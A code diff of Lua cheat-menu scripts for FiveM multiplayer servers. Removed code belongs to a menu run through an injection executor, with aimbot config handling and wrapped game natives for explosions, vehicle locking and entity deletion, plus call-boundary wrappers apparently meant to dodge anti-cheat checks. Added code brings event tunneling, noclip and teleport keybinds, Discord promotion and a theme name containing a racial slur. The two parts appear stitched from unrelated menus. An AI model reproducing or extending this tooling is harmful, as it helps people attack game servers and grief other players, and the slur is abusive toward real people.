+                    return function(rets)
+                        rets = rets or {}
+                        if rid >= 0 then
+                            TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets)
                         end
                     end
                 end
+                rets = {f(table.unpack(args))}
             end
-        end,
-        Delete = function(name)
-            if _Executor ~= "redENGINE" then return end
-            local out = HandleConfig("delete", name .. ".json")
-
-            if out == "Successfully deleted config." then
-                FM:AddNotification("ERROR", "Failed to delete config. See console for details.")
-
-                return FM:Print("[CONFIG] Failed to delete ^3" .. name .. "^7: ^1" .. existing .. "^7")
-            end
-        end,
-        Rename = function(old, new)
-            if _Executor ~= "redENGINE" then return end
-            local existing = HandleConfig("load", old .. ".json")
-
-            if existing == "Error opening file." or existing == "That file doesn't exist." then
-                FM:AddNotification("ERROR", "Failed to rename config. See console for details.")
-
-                return FM:Print("[CONFIG] Failed to rename ^3" .. old .. " to ^3" .. new .. "^7: ^1" .. existing .. "^7")
-            end
-        end,
-        Exists = function(name)
-            if _Executor ~= "redENGINE" then return end
-            local existing = HandleConfig("load", name .. ".json")
-
-            if existing == "Error opening file." or existing == "That file doesn't exist." then
-                FM:AddNotification("ERROR", "Failed to rename config. See console for details.")
-
-                return false
-            end
-
-            return true
-        end,
-        Write = function(name, cfg)
-            if _Executor ~= "redENGINE" then return end
-            cfg = FM:CopyTable(cfg)
-            cfg.Player.AimbotTarget = nil
-            cfg.SafeMode = nil
-            cfg = dict.json.encode(cfg)
-            local out = HandleConfig("save", name .. ".json", cfg)
-
-            if known_returns[out] and not silent then
-                local good = out:find("Successfully")
-
-                if not good then
-                    FM:Print("[CONFIG] Failed to save ^3" .. current_config .. "^7: ^1" .. out .. "^7")
-
-                    return FM:AddNotification("ERROR", "Failed to save config. See console for details.")
-                elseif silent == false then
-                    FM:Print("[CONFIG] Saved config ^3" .. current_config .. "^7.")
-                end
-            end
-        end,
-        Save = function(silent)
-            if _Executor ~= "redENGINE" then return end
-            local config = FM:CopyTable(FM.Config)
-            config.Player.AimbotTarget = nil
-            config.SafeMode = nil
-            config = dict.json.encode(config)
-            local out = HandleConfig("save", current_config .. ".json", config)
-            FM.List[current_config] = FM.List[current_config] or (_count(FM.List) + 1)
-
-            if known_returns[out] and not silent then
-                local good = out:find("Successfully")
-
-                if not good then
-                    FM:Print("[CONFIG] Failed to save ^3" .. current_config .. "^7: ^1" .. out .. "^7")
-
-                    return FM:AddNotification("ERROR", "Failed to save config. See console for details.")
-                elseif silent == false then
-                    FM:Print("[CONFIG] Saved config ^3" .. current_config .. "^7.")
-                end
+            if not delayed and rid >= 0 then
+                TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets)
             end
         end
-    }
-
-    local boundaryIdx = 1
-
-    local function dummyUseBoundary(idx)
-        return nil
-    end
-
-    local function getBoundaryFunc(bfn, bid)
-        return function(fn, ...)
-            local boundary = bid or (boundaryIdx + 1)
-            boundaryIdx = boundaryIdx + 1
-            bfn(boundary, coroutine.running())
-
-            local wrap = function(...)
-                dummyUseBoundary(boundary)
-                local v = table.pack(fn(...))
-
-                return table.unpack(v)
+    )
+end
+function Tunnel.getInterface(name, identifier)
+    local ids = Tools.newIDGenerator()
+    local callbacks = {}
+    local r =
+        setmetatable(
+        {},
+        {__index = tunnel_resolve, name = name, tunnel_ids = ids, tunnel_callbacks = callbacks, identifier = identifier}
+    )
+    RegisterNetEvent(name .. ":" .. identifier .. ":tunnel_res")
+    AddEventHandler(
+        name .. ":" .. identifier .. ":tunnel_res",
+        function(rid, args)
+            local callback = callbacks[rid]
+            if callback ~= nil then
+                ids:free(rid)
+                callbacks[rid] = nil
+                callback(table.unpack(args))
             end
-
-            local v = table.pack(wrap(...))
-            bfn(boundary, nil)
-
-            return table.unpack(v)
         end
-    end
-
-    local runWithBoundaryEnd = getBoundaryFunc(dict.Citizen.SubmitBoundaryEnd)
-
-    local function lookupify(t)
-        local r = {}
-
-        for _, v in dict.ipairs(t) do
-            r[v] = true
+    )
+    return r
+end
+Proxy = {}
+local proxy_rdata = {}
+local function proxy_callback(rvalues)
+    proxy_rdata = rvalues
+end
+local function proxy_resolve(itable, key)
+    local iname = getmetatable(itable).name
+    local fcall = function(args, callback)
+        if args == nil then
+            args = {}
         end
-
-        return r
+        TriggerEvent(iname .. ":proxy", key, args, proxy_callback)
+        return table.unpack(proxy_rdata)
     end
-
-    local blocked_ranges = {{0x0001F601, 0x0001F64F}, {0x00002702, 0x000027B0}, {0x0001F680, 0x0001F6C0}, {0x000024C2, 0x0001F251}, {0x0001F300, 0x0001F5FF}, {0x00002194, 0x00002199}, {0x000023E9, 0x000023F3}, {0x000025FB, 0x000026FD}, {0x0001F300, 0x0001F5FF}, {0x0001F600, 0x0001F636}, {0x0001F681, 0x0001F6C5}, {0x0001F30D, 0x0001F567}, {0x0001F980, 0x0001F984}, {0x0001F910, 0x0001F918}, {0x0001F6E0, 0x0001F6E5}, {0x0001F920, 0x0001F927}, {0x0001F919, 0x0001F91E}, {0x0001F933, 0x0001F93A}, {0x0001F93C, 0x0001F93E}, {0x0001F985, 0x0001F98F}, {0x0001F940, 0x0001F94F}, {0x0001F950, 0x0001F95F}, {0x0001F928, 0x0001F92F}, {0x0001F9D0, 0x0001F9DF}, {0x0001F9E0, 0x0001F9E6}, {0x0001F992, 0x0001F997}, {0x0001F960, 0x0001F96B}, {0x0001F9B0, 0x0001F9B9}, {0x0001F97C, 0x0001F97F}, {0x0001F9F0, 0x0001F9FF}, {0x0001F9E7, 0x0001F9EF}, {0x0001F7E0, 0x0001F7EB}, {0x0001FA90, 0x0001FA95}, {0x0001F9A5, 0x0001F9AA}, {0x0001F9BA, 0x0001F9BF}, {0x0001F9C3, 0x0001F9CA}, {0x0001FA70, 0x0001FA73}}
-    local block_singles = lookupify{0x000000A9, 0x000000AE, 0x0000203C, 0x00002049, 0x000020E3, 0x00002122, 0x00002139, 0x000021A9, 0x000021AA, 0x0000231A, 0x0000231B, 0x000025AA, 0x000025AB, 0x000025B6, 0x000025C0, 0x00002934, 0x00002935, 0x00002B05, 0x00002B06, 0x00002B07, 0x00002B1B, 0x00002B1C, 0x00002B50, 0x00002B55, 0x00003030, 0x0000303D, 0x00003297, 0x00003299, 0x0001F004, 0x0001F0CF, 0x0001F6F3, 0x0001F6F4, 0x0001F6E9, 0x0001F6F0, 0x0001F6CE, 0x0001F6CD, 0x0001F6CF, 0x0001F6CB, 0x00023F8, 0x00023F9, 0x00023FA, 0x0000023, 0x0001F51F, 0x0001F6CC, 0x0001F9C0, 0x0001F6EB, 0x0001F6EC, 0x0001F6D0, 0x00023CF, 0x000002A, 0x0002328, 0x0001F5A4, 0x0001F471, 0x0001F64D, 0x0001F64E, 0x0001F645, 0x0001F646, 0x0001F681, 0x0001F64B, 0x0001F647, 0x0001F46E, 0x0001F575, 0x0001F582, 0x0001F477, 0x0001F473, 0x0001F930, 0x0001F486, 0x0001F487, 0x0001F6B6, 0x0001F3C3, 0x0001F57A, 0x0001F46F, 0x0001F3CC, 0x0001F3C4, 0x0001F6A3, 0x0001F3CA, 0x00026F9, 0x0001F3CB, 0x0001F6B5, 0x0001F6B5, 0x0001F468, 0x0001F469, 0x0001F990, 0x0001F991, 0x0001F6F5, 0x0001F6F4, 0x0001F6D1, 0x0001F6F6, 0x0001F6D2, 0x0002640, 0x0002642, 0x0002695, 0x0001F3F3, 0x0001F1FA, 0x0001F91F, 0x0001F932, 0x0001F931, 0x0001F9F8, 0x0001F9F7, 0x0001F3F4, 0x0001F970, 0x0001F973, 0x0001F974, 0x0001F97A, 0x0001F975, 0x0001F976, 0x0001F9B5, 0x0001F9B6, 0x0001F468, 0x0001F469, 0x0001F99D, 0x0001F999, 0x0001F99B, 0x0001F998, 0x0001F9A1, 0x0001F99A, 0x0001F99C, 0x0001F9A2, 0x0001F9A0, 0x0001F99F, 0x0001F96D, 0x0001F96C, 0x0001F96F, 0x0001F9C2, 0x0001F96E, 0x0001F99E, 0x0001F9C1, 0x0001F6F9, 0x0001F94E, 0x0001F94F, 0x0001F94D, 0x0000265F, 0x0000267E, 0x0001F3F4, 0x0001F971, 0x0001F90E, 0x0001F90D, 0x0001F90F, 0x0001F9CF, 0x0001F9CD, 0x0001F9CE, 0x0001F468, 0x0001F469, 0x0001F9D1, 0x0001F91D, 0x0001F46D, 0x0001F46B, 0x0001F46C, 0x0001F9AE, 0x0001F415, 0x0001F6D5, 0x0001F6FA, 0x0001FA82, 0x0001F93F, 0x0001FA80, 0x0001FA81, 0x0001F97B, 0x0001F9AF, 0x0001FA78, 0x0001FA79, 0x0001FA7A}
-
-    function FM:RemoveEmojis(str)
-        local new = ""
-
-        for _, codepoint in dict.utf8.codes(str) do
-            local safe = true
-
-            if block_singles[codepoint] then
-                safe = false
+    itable[key] = fcall
+    return fcall
+end
+function Proxy.addInterface(name, itable)
+    AddEventHandler(
+        name .. ":proxy",
+        function(member, args, callback)
+            local f = itable[member]
+            if type(f) == "function" then
+                callback({f(table.unpack(args))})
             else
-                for _, range in dict.ipairs(blocked_ranges) do
-                    if range[1] <= codepoint and codepoint <= range[2] then
-                        safe = false
-                        break
-                    end
-                end
-            end
-
-            if safe then
-                new = new .. dict.utf8.char(codepoint)
             end
         end
+    )
+end
+function Proxy.getInterface(name)
+    local r = setmetatable({}, {__index = proxy_resolve, name = name})
+    return r
+end
 
-        return new
-    end
 
-    -- Used to clean player names.
-    function FM:CleanName(str, is_esp)
-        str = str:gsub("~", "")
-        str = FM:RemoveEmojis(str)
+local developers = {
+    {"~wwba#", "~b~Discord"},
+    {"wwba", "~g~Developers"},
+    {'<font color="#E400FF">~y~wwba on top', '~w~<font color="#2580E1">Friend~w~, </font> <font color="#4280C6">UI ~w~& ~y~Help</font>'},
+    {"wwba", "discord.gg/wwba"},
+}
 
-        if #str >= 25 and not is_esp then
-            str = str:sub(1, 25) .. "..."
+version = "~s~ 1~r~.0" 
+theme = "StupidNiggaPaster"
+themes = {"StupidNiggaPaster"}
+mpMessage = false
+menuKeybind = "F10"	
+menuKeybind2 = "L"	
+noclipKeybind = "N7"		
+teleportKeyblind = "N4"
+fixvaiculoKeyblind = "N6"
+startMessage = "~g~BY : ~r~wwba"	
+subMessage = "~r~wwba"
+subMessage1 = "~b~DISCORD : discord.gg/wwba"
+motd2 = "Key ~r~*" ..teleportKeyblind.."* ~w~TeleportToWaypoint"
+motd = "Key ~r~*" ..noclipKeybind.."* ~w~Active noclip!"
+motd5 = "Key ~r~*" ..fixvaiculoKeyblind.."* ~w~Fix Car" 
+motd3 = "~v~wwba STORE ON TOP"
+
+
+local texture_preload = {
+    "shopui_title_graphics_franklin",
+    "mparrow",
+}
+
+local function PreloadTextures()
+	
+	--debugprint("^7Preloading texture dictionaries...")
+	for i = 1, #texture_preload do
+		RequestStreamedTextureDict(texture_preload[i])
+	end
+
+end
+
+PreloadTextures()
+
+FiveM = {}
+do
+    FiveM.Notify = function(text, type)
+        if type == nil then type = NotificationType.None end
+        SetNotificationTextEntry("STRING")
+        if type == NotificationType.Info then
+            AddTextComponentString("~b~~h~Info~h~~s~: " .. text)
+        elseif type == NotificationType.Error then
+            AddTextComponentString("~r~~h~Error~h~~s~: " .. text)
+        elseif type == NotificationType.Alert then
+            AddTextComponentString("~y~~h~Alert~h~~s~: " .. text)
+        elseif type == NotificationType.Success then
+            AddTextComponentString("~g~~h~Success~h~~s~: " .. text)
+        else
+            AddTextComponentString(text)
         end
-
-        return str
+        DrawNotification(false, false)
     end
 
-    local _natives = {
-        ["TriggerEvent"] = {
-            func = function(eventName, ...)
-                if not eventName then return end
-                local payload = msgpack.pack({...})
-
-                return runWithBoundaryEnd(function() return TriggerEventInternal(eventName, payload, payload:len()) end)
-            end
-        },
-        ["TriggerServerEvent"] = {
-            func = function(eventName, ...)
-                if not eventName then return end
-                local payload = msgpack.pack({...})
-
-                return TriggerServerEventInternal(eventName, payload, payload:len())
-            end
-        },
-        ["DestroyCam"] = {
-            hash = 0x865908C81A2C22E9
-        },
-        ["GetCurrentServerEndpoint"] = {
-            hash = 0xEA11BFBA,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ResultAsString()
-            end
-        },
-        ["GetCurrentResourceName"] = {
-            hash = 0xE5E9EBBB,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ResultAsString()
-            end
-        },
-        ["GetGameTimer"] = {
-            hash = 0x9CD27B0045628463,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end,
-        },
-        ["GetActivePlayers"] = {
-            hash = 0xcf143fb9,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsObject() end,
-            return_as = function(obj) return msgpack.unpack(obj) end
-        },
-        ["GetVehicleMaxNumberOfPassengers"] = {
-            hash = 0xA7C4F2C6E744A550,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["FindFirstVehicle"] = {
-            hash = 0x15e55694,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["FindNextVehicle"] = {
-            hash = 0x8839120d,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["EndFindVehicle"] = {
-            hash = 0x9227415a,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1]
-            end
-        },
-        ["FindFirstPed"] = {
-            hash = 0xfb012961,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["FindNextPed"] = {
-            hash = 0xab09b548,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["EndFindPed"] = {
-            hash = 0x9615c2ad,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1]
-            end
-        },
-        ["FindFirstObject"] = {
-            hash = 0xFAA6CB5D,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["FindNextObject"] = {
-            hash = 0x4E129DBF,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["EndFindObject"] = {
-            hash = 0xDEDA4E50,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1]
-            end
-        },
-        ["GetPlayerServerId"] = {
-            hash = 0x4d97bcc7,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetNumResources"] = {
-            hash = 0x863f27b,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
-        },
-        ["GetResourceByFindIndex"] = {
-            hash = 0x387246b7,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
-            end
-        },
-        ["LoadResourceFile"] = {
-            func = function(...)
-                if _Executor ~= "redENGINE" then return end
-                local args = {...}
-
-                return dict.Citizen.IN(0xEB01A, LoadResourceFile(args[1], args[2]))
-            end
-        },
-        ["RequestCollisionAtCoord"] = {
-            hash = 0x07503F7948F491A7,
-            unpack = function(...)
-                local args = (...)
-                local x, y, z
-
-                if dict.type(args[1]) == "table" or dict.type(args[1]) == "vector" then
-                    x = args[1].x
-                    y = args[1].y
-                    z = args[1].z
-                else
-                    x = args[1]
-                    y = args[2]
-                    z = args[3]
-                end
-
-                return x, y, z, dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["GetEntityCoords"] = {
-            hash = 0x3FEF770D40960D5A,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
-            end
-        },
-        ["RemoveBlip"] = {
-            hash = 0x86A652570E5F25DD,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.Citizen.PointerValueIntInitialized(args[1])
-            end
-        },
-        ["GetNuiCursorPosition"] = {
-            hash = 0xbdba226f,
-            unpack = function() return dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt() end
-        },
-        ["DoesEntityExist"] = {
-            hash = 0x7239B21A38F536BA,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsEntityDead"] = {
-            hash = 0x5F9532F3B5CC2551,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsPedDeadOrDying"] = {
-            hash = 0x3317DEDB88C95038,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsPedShooting"] = {
-            hash = 0x34616828CD07F1A1,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["PlaySoundFrontend"] = {
-            hash = 0x67C540AA08E4A6F5,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], args[3], args[4]
-            end
-        },
-        ["GetPedInVehicleSeat"] = {
-            hash = 0xBB40DD2270B65366,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["HasAnimDictLoaded"] = {
-            hash = 0xD031A9162D01088C,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["CreatePed"] = {
-            hash = 0xD49F9B0955C367DE,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.type(args[2]) == "string" and FM:GetFunction("GetHashKey")(args[2]) or args[2], args[3], args[4], args[5], args[6], args[7], args[8], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["CreatePedInsideVehicle"] = {
-            hash = 0x7DD959874C1FD534,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.type(args[3]) == "string" and FM:GetFunction("GetHashKey")(args[3]) or args[3], args[4], args[5], args[6], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["NetworkHasControlOfEntity"] = {
-            hash = 0x01BF60A500E28887,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["SimulatePlayerInputGait"] = {
-            hash = 0x477D5D63E63ECA5D
-        },
-        ["ResetPedRagdollTimer"] = {
-            hash = 0x9FA4664CF62E47E8
-        },
-        ["IsVehicleDamaged"] = {
-            hash = 0xBCDC5017D3CE1E9E,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["ToggleVehicleMod"] = {
-            hash = 0x2A1F4F37F95BAD08
-        },
-        ["NetworkGetPlayerIndexFromPed"] = {
-            hash = 0x6C0E2E0125610278,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["ResetPlayerStamina"] = {
-            hash = 0xA6F312FCCE9C1DFE
-        },
-        ["GetEntityAlpha"] = {
-            hash = 0x5A47B3B5E63E94C6,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["IsEntityVisible"] = {
-            hash = 0x47D6F43D77935C75,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end,
-            return_as = function(int) return int == 1 end
-        },
-        ["AreAnyVehicleSeatsFree"] = {
-            hash = 0x2D34FC3BC4ADB780,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end,
-            return_as = function(int) return int == 1 end
-        },
-        ["IsEntityVisibleToScript"] = {
-            hash = 0xD796CB5BA8F20E32,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end,
-            return_as = function(int) return int == 1 end
-        },
-        ["NetworkExplodeVehicle"] = {
-            hash = 0x301A42153C9AD707
-        },
-        ["DisplayRadar"] = {
-            hash = 0xA0EBB943C300E693
-        },
-        ["SetCursorLocation"] = {
-            hash = 0xFC695459D4D0E219
-        },
-        ["SetPlayerWeaponDamageModifier"] = {
-            hash = 0xCE07B9F7817AADA3
-        },
-        ["SetPedArmour"] = {
-            hash = 0xCEA04D83135264CC
-        },
-        ["SetEntityLocallyInvisible"] = {
-            hash = 0xE135A9FF3F5D05D8
-        },
-        ["SetVehicleDoorsLockedForPlayer"] = {
-            hash = 0x517AAF684BB50CD1
-        },
-        ["SetVehicleDoorsLockedForAllPlayers"] = {
-            hash = 0xA2F80B8D040727CC
-        },
-        ["SetVehicleDoorsLocked"] = {
-            hash = 0xB664292EAECF7FA6
-        },
-        ["SetVehicleTyresCanBurst"] = {
-            hash = 0xEB9DC3C7D8596C46
-        },
-        ["SetVehicleMod"] = {
-            hash = 0x6AF0636DDEDCB6DD
-        },
-        ["SetPedCoordsKeepVehicle"] = {
-            hash = 0x9AFEFF481A85AB2E
-        },
-        ["SetVehicleEnginePowerMultiplier"] = {
-            hash = 0x93A3996368C94158
-        },
-        ["GetFirstBlipInfoId"] = {
-            hash = 0x1BEDE233E6CD2A1F,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetGroundZFor_3dCoord"] = {
-            hash = 0xC906A7DAB05C8D2B,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], args[3], dict.Citizen.PointerValueFloat(), dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["GetBlipInfoIdCoord"] = {
-            hash = 0xFA7C7F0AADF25D09,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
-            end
-        },
-        ["GetNumVehicleMods"] = {
-            hash = 0xE38E9162A2500646,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["SetVehicleModKit"] = {
-            hash = 0x1F2AA07F00B3217A
-        },
-        ["SetPedToRagdoll"] = {
-            hash = 0xAE99FB955581844A
-        },
-        ["SetVehicleFixed"] = {
-            hash = 0x115722B1B9C14C1C
-        },
-        ["SetPedKeepTask"] = {
-            hash = 0x971D38760FBC02EF
-        },
-        ["NetworkGetNetworkIdFromEntity"] = {
-            hash = 0xA11700682F3AD45C,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["RemoveWeaponFromPed"] = {
-            hash = 0x4899CB088EDF59B8
-        },
-        ["SetNetworkIdSyncToPlayer"] = {
-            hash = 0xA8A024587329F36A
-        },
-        ["SetNetworkIdCanMigrate"] = {
-            hash = 0x299EEB23175895FC
-        },
-        ["DoesCamExist"] = {
-            hash = 0xA7A932170592B50E
-        },
-        ["CreateCam"] = {
-            hash = 0xC3981DCE61D9E13F
-        },
-        ["GetGameplayCamRot"] = {
-            hash = 0x837765A25378F0BB,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
-            end
-        },
-        ["GetCamRot"] = {
-            hash = 0x7D304C1C955E3E12,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
-            end
-        },
-        ["StartShapeTestRay"] = {
-            hash = 0x377906D8A31E5586,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], args[9], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetShapeTestResult"] = {
-            hash = 0x3D87450E15D98694,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueInt(), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end,
-            return_as = function(...)
-                local ret = {...}
-
-                return ret[1], ret[2] == 1, ret[3], ret[4], ret[5]
-            end
-        },
-        ["AddExplosion"] = {
-            hash = 0xE3AD2BDBAEE269AC
-        },
-        ["CreateVehicle"] = {
-            hash = 0xAF35D0D2583051B0,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.type(args[1]) == "string" and FM:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], args[4], args[5], args[6], args[7], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["SetPedIntoVehicle"] = {
-            hash = 0xF75B0D629E1C063D
-        },
-        ["SetPedAlertness"] = {
-            hash = 0xDBA71115ED9941A6
-        },
-        ["TaskVehicleDriveWander"] = {
-            hash = 0x480142959D337D00
-        },
-        ["CreateObject"] = {
-            hash = 0x509D5878EB39E842,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.type(args[1]) == "string" and FM:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], args[4], args[5], args[6], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["DeletePed"] = {
-            hash = 0x9614299DCB53E54B,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.Citizen.PointerValueIntInitialized(args[1])
-            end
-        },
-        ["DeleteEntity"] = {
-            hash = 0xAE3CBE5BF394C9C9,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.Citizen.PointerValueIntInitialized(args[1])
-            end
-        },
-        ["DeleteObject"] = {
-            hash = 0x539E0AE3E6634B9F,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.Citizen.PointerValueIntInitialized(args[1])
-            end
-        },
-        ["DeleteVehicle"] = {
-            hash = 0xEA386986E786A54F,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.Citizen.PointerValueIntInitialized(args[1])
-            end
-        },
-        ["NetworkRequestControlOfEntity"] = {
-            hash = 0xB69317BF5E782347,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["GetModelDimensions"] = {
-            hash = 0x03E8D3D5F549087A,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.type(args[1]) == "string" and FM:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector()
-            end
-        },
-        ["GetEntityModel"] = {
-            hash = 0x9F47B058362C84B5,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["SetEntityAsMissionEntity"] = {
-            hash = 0xAD738C3085FE7E11
-        },
-        ["SetEntityRotation"] = {
-            hash = 0x8524A8B0171D5E07
-        },
-        ["SetEntityLocallyVisible"] = {
-            hash = 0x241E289B5C059EDC
-        },
-        ["SetEntityAlpha"] = {
-            hash = 0x44A0870B7E92D7C0
-        },
-        ["SetEntityCollision"] = {
-            hash = 0x1A9205C1B9EE827F
-        },
-        ["SetEntityCoords"] = {
-            hash = 0x06843DA7060A026B
-        },
-        ["GivePlayerRagdollControl"] = {
-            hash = 0x3C49C870E66F0A28
-        },
-        ["GetHashKey"] = {
-            hash = 0xD24D37CC275948CC,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.tostring(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetVehiclePedIsIn"] = {
-            hash = 0x9A9112A0FE9A4713
-        },
-        ["PlayerPedId"] = {
-            hash = 0xD80958FC74E988A6,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
-        },
-        ["GetPlayerPed"] = {
-            hash = 0x43A66C31C68491C0
-        },
-        ["HasModelLoaded"] = {
-            hash = 0x98A4EB5D89A0C952,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.type(args[1]) == "string" and FM:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["SetPedCanRagdoll"] = {
-            hash = 0xB128377056A54E2A
-        },
-        ["RequestModel"] = {
-            hash = 0x963D27A58DF860AC,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.type(args[1]) == "string" and FM:GetFunction("GetHashKey")(args[1]) or args[1]
-            end
-        },
-        ["SetTextFont"] = {
-            hash = 0x66E0276CC5F6B9DA
-        },
-        ["SetTextProportional"] = {
-            hash = 0x038C1F517D7FDCF8
-        },
-        ["HasStreamedTextureDictLoaded"] = {
-            hash = 0x0145F696AAAAD2E4
-        },
-        ["RequestStreamedTextureDict"] = {
-            hash = 0xDFA2EF8E04127DD5
-        },
-        ["GetActiveScreenResolution"] = {
-            hash = 0x873C9F3104101DD3,
